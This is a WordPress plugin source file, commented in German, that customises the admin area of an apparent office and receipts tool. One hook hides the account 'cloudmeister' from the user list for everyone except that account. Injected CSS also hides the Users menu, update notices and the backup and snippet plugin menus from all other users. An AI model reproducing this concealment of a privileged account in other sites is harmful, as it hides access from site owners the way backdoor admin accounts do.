<?php namespace CLOUDMEISTER\CMX\Buero; defined('ABSPATH') || die('Oxytocin!');


require_once 'public_box.php';
require_once 'permalink.php';
require_once 'excerpt.php';
require_once 'messages.php';
require_once 'admin_ui.php';
require_once 'login_manager.php';
require_once 'call.php';
require_once 'datas.php';




/** docu rju 2025-11-11: Benutzer "cloudmeister" wird aus der liste ausgeblenden */
add_action('pre_get_users', function($query) {
	if (is_admin() && $GLOBALS['pagenow'] === 'users.php') {
		$current_user = wp_get_current_user(); // Aktuellen Benutzer abrufen

		if ($current_user->user_login !== 'cloudmeister') { // Nur ausblenden, wenn der aktuelle Benutzer NICHT 'cloudmeister' ist
			$user = get_user_by('login', 'cloudmeister');
			if ($user && isset($user->ID)) {
				$exclude = (array) $query->get('exclude', []);
				$exclude[] = $user->ID;
				$query->set('exclude', $exclude);
			}
		}
	}
});


/**
 * Rekursives array_change_key_case()
 */
function cmx_array_change_key_case_recursive(array $arr, int $case = CASE_LOWER): array {
		$result = [];
		foreach ($arr as $k => $v) {
				$key = is_string($k) ? ($case === CASE_UPPER ? strtoupper($k) : strtolower($k)) : $k;
				if (is_array($v)) {
						$result[$key] = cmx_array_change_key_case_recursive($v, $case);
				} else {
						$result[$key] = $v;
				}
		}
		return $result;
}


/**
 * Entfernt den "Anzeigen"-Link aus den Zeilenaktionen
 * aller benutzerdefinierten Post Types im Adminbereich.
 */
/**
 * Entfernt "Anzeigen" und "Schnellbearbeiten" aus den Zeilenaktionen
 * für alle benutzerdefinierten Post Types im Adminbereich.
 */
\add_filter('post_row_actions', __NAMESPACE__ . '\\cmx_remove_unwanted_row_links', 10, 2);
\add_filter('page_row_actions', __NAMESPACE__ . '\\cmx_remove_unwanted_row_links', 10, 2);

function cmx_remove_unwanted_row_links(array $actions, \WP_Post $post): array {
		// Nur für Custom Post Types (keine Standardtypen)
		$builtin = ['post', 'page', 'attachment', 'revision', 'nav_menu_item'];
		if (!in_array($post->post_type, $builtin, true)) {
				unset($actions['view']);       // Entfernt "Anzeigen"
				unset($actions['inline hide-if-no-js']); // Entfernt "Schnellbearbeiten"
		}
		return $actions;
}





/**
 * Entfernt den Link "Veröffentlicht" aus allen CPT-Listen im Adminbereich.
 */
add_action('admin_init', function() {
	// Alle Custom Post Types ermitteln (ohne die Standardtypen post/page)
	$post_types = get_post_types(['_builtin' => false], 'names');

	// Für jeden CPT den Filter registrieren
	foreach ($post_types as $pt) {
		add_filter('views_edit-' . $pt, __NAMESPACE__ . '\\cmx_remove_published_link');
	}
});

/**
 * Entfernt den Link "Veröffentlicht" aus der Liste.
 *
 * @param array $views
 * @return array
 */
function cmx_remove_published_link(array $views): array {
	if (isset($views['publish'])) {
		unset($views['publish']);
	}
	return $views;
}



// Gutenberg (Block Editor) komplett deaktivieren
add_filter('use_block_editor_for_post', '__return_false', 10);
add_filter('use_block_editor_for_post_type', '__return_false', 10);

// Optional: Widgets-Block-Editor ebenfalls deaktivieren
add_filter('use_widgets_block_editor', '__return_false');

// Optional: Full-Site-Editor (FSE) verhindern
add_action('after_setup_theme', function() {
	remove_theme_support('block-templates');
});



require_once 'untrashed.php';
require_once 'dublicate.php';


// add_action('wp_head', function() {
// 	echo '<style>
// 		.single-belege h1.entry-title,
// 		.single-kontakte h1.entry-title,
// 		.single-artikel h1.entry-title {
// 			display: none !important;
// 		}
// 	</style>';
// 	if (!in_array(get_post_type(), ['belege', 'kontakte', 'artikel'])) {
// 		the_title('<h1 class="entry-title">', '</h1>');
// 	}

// });





/**
 * Überschreibt die Standard-Admin-Meldungen beim Löschen/Ändern von Beiträgen
 */
// add_filter('post_updated_messages', function($messages) {
// 	foreach ($messages as $post_type => &$msgs) {
// 		// Index 1 = aktualisiert, 6 = veröffentlicht, 10 = geplant, etc.
// 		// Papierkorb: Index 2, wenn gelöscht oder verschoben
// 		if (isset($msgs[1])) $msgs[1] = 'aktuallisiert';
// 		if (isset($msgs[2])) $msgs[2] = 'gelöscht';
// 		if (isset($msgs[3])) $msgs[3] = '333';
// 		if (isset($msgs[6])) $msgs[6] = 'gespeichert';
// 		if (isset($msgs[7])) $msgs[7] = '7777';
// 		if (isset($msgs[8])) $msgs[8] = '888';
// 	}
// 	return $messages;
// });


// add_action('deleted_post', function($post_id) {
// 	add_action('admin_notices', function() {
// 		echo '<div class="notice notice-success is-dismissible"><p>Alles weg</p></div>';
// 	});
// });

/**

| Index  | Standardmeldung (Beispiel)                      | Bedeutung / Ereignis                  |
| :----- | :---------------------------------------------- | :------------------------------------ |
| **0**  | –                                               | (nicht genutzt)                       |
| **1**  | „Beitrag aktualisiert.“                         | Nach dem Speichern / Aktualisieren    |
| **2**  | „Benutzerdefiniertes Feld aktualisiert.“        | Wenn Meta-Feld gespeichert wurde      |
| **3**  | „Benutzerdefiniertes Feld gelöscht.“            | Wenn Meta-Feld gelöscht wurde         |
| **4**  | „Beitrag aktualisiert.“                         | Duplicate von 1 (Legacy)              |
| **5**  | „Beitrag wiederhergestellt auf Revision von %s“ | Wenn Revision wiederhergestellt wurde |
| **6**  | „Beitrag veröffentlicht.“                       | Nach Veröffentlichung                 |
| **7**  | „Beitrag gespeichert.“                          | Wenn als Entwurf gespeichert          |
| **8**  | „Beitrag eingereicht.“                          | Wenn als Review eingereicht           |
| **9**  | „Beitrag geplant für: %s.“                      | Wenn Veröffentlichung geplant wurde   |
| **10** | „Entwurf aktualisiert.“                         | Beim Speichern eines Entwurfs         |
 */


// TITLE Bereich
add_filter('enter_title_here', function($title, $post) {
	if ($post->post_type === 'belege') {
		$title = '{Der Name des Beleges wird hier automatisch vergeben}';
	}
	return $title;
}, 10, 2);


add_action('admin_head', function() {
	$screen = get_current_screen();
	if ($screen && $screen->post_type === 'belege') {
		echo '<style> div#titlediv { background:#f7f7f7 !important; pointer-events:none; } </style>';
		// echo '<script>document.addEventListener("DOMContentLoaded",()=>{const t=document.getElementById("title");if(t){t.readOnly=true;}});</script>';
	}
	if(wp_get_current_user()->user_login !== 'cloudmeister') {
	echo '
	<style>
		#wp-admin-bar-view, #ehe-admin-cb, #dashboard_site_health, #dashboard_right_now, #dashboard_quick_press, #dashboard_primary, #dashboard_activity, #wpa_dashboard_widget, #wp-admin-bar-site-name,
		#welcome-panel, #dashboard_site_health-hide, label[for="dashboard_site_health-hide"], #dashboard_right_now-hide, label[for="dashboard_right_now-hide"], #wp-admin-bar-mis-buero,
		#dashboard_activity-hide, label[for="dashboard_activity-hide"], #dashboard_primary-hide, label[for="dashboard_primary-hide"], #wp_welcome_panel-hide, label[for="wp_welcome_panel-hide"],
		#dashboard_quick_press-hide, label[for="dashboard_quick_press-hide"], #wpa_dashboard_widget-hide, label[for="wpa_dashboard_widget-hide"], #wp-admin-bar-updates,
		#fluentsmtp_reports_widget, label[for="fluentsmtp_reports_widget-hide"], #e-dashboard-overview, #wp-admin-bar-wpvivid_admin_menu,
		.toplevel_page_wpvivid-dashboard, .toplevel_page_migrateguru, .toplevel_page_elementor, .menu-icon-elementor_library, .elementor, .menu-icon-users, #toplevel_page_fluent-snippets, .updated.success
		{ display:none !important; }
	</style>';
	}
});


/**
 * Entfernt alle Standard-Dashboard-Widgets,
 * lässt aber bestimmte eigene Widgets stehen.
 */
add_action('wp_dashboard_setup', function () {

	global $wp_meta_boxes;

	// IDs deiner eigenen Widgets (hier ergänzen, falls mehrere)
	if(wp_get_current_user()->user_login !== 'cloudmeister') {
		remove_action('welcome_panel', 'wp_welcome_panel');


		$allow = [
			'cmx_dashboard_widget',
		];

		// Bereiche im Dashboard
		$areas = [
			'normal', 'side',
		];

		foreach ($areas as $area) {

			if (!isset($wp_meta_boxes['dashboard'][$area])) {
				continue;
			}

			foreach ($wp_meta_boxes['dashboard'][$area] as $priority => $widgets) {

				foreach ($widgets as $widget_id => $widget) {

					if (!in_array($widget_id, $allow, true)) {
						unset($wp_meta_boxes['dashboard'][$area][$priority][$widget_id]);
					}
				}
			}
		}
	}
});








// wp-not-current-submenu wp-menu-separator elementor: .menu-icon-users,
// .wp-not-current-submenu,
// 		.wp-has-submenu wp-not-current-submenu menu-top toplevel_page_wpvivid-dashboard menu-top-first, wp-not-current-submenu menu-top toplevel_page_migrateguru menu-top-last
// 		.toplevel_page_wpvivid-dashboard, .toplevel_page_migrateguru, .toplevel_page_elementor, .menu-icon-elementor_library, .wp-not-current-submenu wp-menu-separator


add_action('admin_footer', function() {
	if (get_current_screen()->post_type !== 'belege') return;
	?>
	<script>
	document.addEventListener('DOMContentLoaded', () => {
		const title = document.querySelector('#title');
		if (!title || title.value.trim() !== '') return;

		document.querySelectorAll('label').forEach(label => {
			if (label.textContent.trim().toLowerCase().includes('rechnung')) {
				const input = label.querySelector('input[name="cmx_beleg_kategorie"]');
				if (input) {
					input.checked = true;
					input.dispatchEvent(new Event('change', { bubbles: true }));

					// Danach auf das Betreff-Feld springen
					setTimeout(() => {
						const betreff = document.querySelector('[name="cmx_beleg_betreff"]');
						if (betreff) betreff.focus();
					}, 150);
				}
			}
		});
	});
	</script>
	<?php
});


// info rju 2025-11-05: Entfernt alle Standard-Datumsspalten aus den Admin-Listen
add_filter('manage_posts_columns', function($columns) {
	unset($columns['date']);
	return $columns;
});

/** docu rju 2025-11-05: Entfernt die Standard-Datumsspalte aus der Admin-Liste eines CPT */
// add_filter('manage_edit-belege_columns', function($columns) {
// 	unset($columns['date']); // entfernt die Standard-Datumsspalte
// 	return $columns;
// });
